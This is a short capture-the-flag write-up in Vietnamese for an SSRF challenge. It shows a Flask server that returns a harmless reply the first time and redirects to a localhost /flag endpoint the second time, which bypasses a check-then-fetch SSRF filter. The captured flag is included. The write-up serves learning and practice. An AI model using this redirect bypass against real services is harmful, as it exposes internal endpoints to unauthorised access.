# Solution


Bài này là một dạng SSRF khá quen thuộc, đầu tiên dùng `advocate.get(url)` để ngăn chặn ssrf sau đó `requests.get(url)` để lấy response và hiển thị cho người dùng.

Để bypass ssrf preventation thì ta có thể tạo một web server sao cho lần đầu tiên trả về một response hợp lệ và ở lần thứ 2 thì redirect đến `/flag`.

```py
from flask import Flask, request, render_template, redirect
import requests

app = Flask(__name__)

count = 0

@app.route('/', methods=['GET', 'POST'])
def index():
    global count
    if count == 0:
        count +=1
        return "haha"
    else:
        return redirect("http://127.0.0.1:80/flag")

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=8000)        
```


**SEE{y0u_m34n_7h3_53rv3r_r35p0n53_c4n_ch4n63_369e7e3531c987fa4a4c9cfd4f97f2f6}**